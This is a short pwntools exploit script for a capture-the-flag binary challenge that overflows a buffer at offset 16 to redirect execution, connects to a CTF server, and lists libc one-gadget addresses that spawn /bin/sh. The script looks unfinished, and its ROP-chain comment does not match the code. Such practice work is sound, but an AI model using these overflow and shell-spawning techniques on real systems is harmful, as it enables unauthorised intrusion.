#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('challenge')
r = ROP(elf)
libc = ELF('rop2_libc.so')
getGadget = lambda x: p64(r.find_gadget(x).address)
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('university.opentoallctf.com',  30002)  
##############################
io = start()
# call write(1, ) ROP chain style

exploit = p64(elf.sym['ask'])
io.send(fit({16: exploit}))
io.interactive()
##############################
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''